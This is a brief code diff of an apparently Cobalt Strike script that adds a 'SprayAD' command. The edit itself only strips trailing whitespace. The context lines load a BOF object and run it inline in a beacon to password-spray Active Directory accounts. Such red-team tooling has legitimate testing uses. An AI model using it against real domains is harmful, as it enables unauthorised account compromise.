@@ -21,7 +21,7 @@ alias SprayAD {
 		berror($bid, "Please specify a password to test.");
 		return;
 	}
-    
+
     # Read in the right BOF file
     $handle = openf(script_resource("SprayAD." . barch($bid) . ".o"));
     $data   = readb($handle, -1);
@@ -37,7 +37,7 @@ alias SprayAD {
     else {
          $arg_data  = bof_pack($bid, "ZZZ", $object, $ldapfilter, $authservice);
     }
-    
+
     blog($bid, "Let's start spraying useraccounts with password: " . $object);
     beacon_inline_execute($bid, $data, "go", $arg_data);
 }
